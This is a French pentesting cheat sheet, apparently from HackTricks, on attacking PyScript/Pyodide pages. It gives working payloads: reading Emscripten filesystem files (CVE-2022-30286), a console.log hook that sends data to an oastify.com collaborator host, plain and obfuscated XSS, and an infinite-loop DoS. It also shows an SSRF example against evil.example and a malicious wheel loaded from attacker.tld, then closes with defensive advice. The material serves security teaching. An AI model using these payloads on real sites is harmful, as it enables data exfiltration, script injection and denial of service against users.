# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## Guide de pentesting de PyScript

PyScript est un nouveau framework développé pour intégrer Python dans HTML afin de pouvoir l'utiliser avec HTML. Dans cette fiche mémo, vous découvrirez comment utiliser PyScript à des fins de pentesting.

### Dumping / Récupération de fichiers depuis le système de fichiers de la mémoire virtuelle d'Emscripten :

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Result :

![Guide de pentesting PyScript - Dumping / Récupération de fichiers depuis le système de fichiers de mémoire virtuelle d’Emscripten : = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration du système de fichiers de mémoire virtuelle d’Emscripten (surveillance de la console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code :
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Résultat :

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) : Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinaire)

Code :
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Résultat :

![Exfiltration de données OOB du système de fichiers de mémoire virtuelle Emscripten (surveillance de la console) - Cross Site Scripting (Ordinary) : Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Code :
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Résultat :

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Code :
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Résultat :

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Boucle infinie)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Boucle infinie)

Code :
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Résultat :

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Nouvelles vulnérabilités et techniques (2023-2025)

### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0` ignore les paramètres de requête `redirect` et `retries` lorsqu'ils sont utilisés avec le transport navigateur de Pyodide. Si un attaquant peut influencer les URLs cibles, le code peut suivre des redirections inter-domaines même lorsqu'il demande à urllib3 de les désactiver, compromettant ainsi les défenses contre les SSRF.<sup>[[1]](#references)[[4]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
"GET",
"https://evil.example/302",
retries=False,
redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
Mettre à niveau vers `urllib3 >= 2.5.0` pour Node.js, mais ne pas s’appuyer sur urllib3 pour désactiver les redirections dans les navigateurs ; valider les destinations ou utiliser une allow-list avant d’effectuer les requêtes.<sup>[[4]](#references)</sup>

### Chargement arbitraire de packages et supply-chain attacks

La configuration Pyodide de PyScript accepte des URLs arbitraires de wheels dans `packages` ; si un attaquant peut modifier ou injecter cette configuration, un import ultérieur peut exécuter du code Python contrôlé par l’attaquant dans le navigateur de la victime.<sup>[[5]](#references)[[6]](#references)</sup>
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide peut installer des wheels pure-Python depuis des URL arbitraires sans compilation WebAssembly du package.<sup>[[6]](#references)</sup> Gardez cette configuration sous le contrôle des développeurs, autorisez uniquement les noms de packages ou les URL exacts, et vérifiez les empreintes des wheels distants lors du build ou du déploiement.

### Modifications de la sanitisation de la sortie (2023+)

* Dans l’implémentation 2022.05.1 utilisée par les exemples legacy, `print()` écrit une sortie `text/plain` sans échappement HTML et est donc vulnérable aux XSS.<sup>[[8]](#references)</sup>
* L’utilitaire actuel `display()` **échappe le HTML par défaut** pour les chaînes simples ; le markup brut doit être encapsulé dans `pyscript.HTML()`.<sup>[[2]](#references)</sup>
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Utilisez `display()` pour les entrées non fiables et ne transmettez pas de chaînes non fiables à `HTML()`.<sup>[[2]](#references)</sup>

---

## Bonnes pratiques défensives

* **Maintenez les packages à jour** – utilisez `urllib3 >= 2.5.0` dans Node.js et examinez séparément les hypothèses relatives aux redirections du navigateur.<sup>[[4]](#references)</sup>
* **Limitez les sources de packages** – autorisez uniquement les noms PyPI ou les URL exactes de confiance, et vérifiez les empreintes des wheels distantes pendant le build ou le déploiement.<sup>[[5]](#references)[[6]](#references)</sup>
* **Renforcez la Content Security Policy** – interdisez le JavaScript inline (`script-src 'self' 'sha256-…'`) afin que les blocs `<script>` injectés ne puissent pas s’exécuter.
* **Interdisez les balises `<py-script>` / `<script type="py">` fournies par l’utilisateur** – assainissez le HTML sur le serveur avant de le renvoyer à d’autres utilisateurs.
* **Isolez les workers** – si vous n’avez pas besoin d’un accès synchrone au DOM depuis les workers, activez le flag `sync_main_only` afin d’éviter `SharedArrayBuffer` et les exigences associées en matière d’en-têtes CORS.<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [Documentation des built-ins de PyScript – `display` et `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - L’art du chaînage de vulnérabilités (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [Avis de sécurité urllib3 – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [Documentation de configuration de PyScript – packages et `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – Chargement des packages](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [Implémentation de `pyscript.py` de PyScript 2022.05.1](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
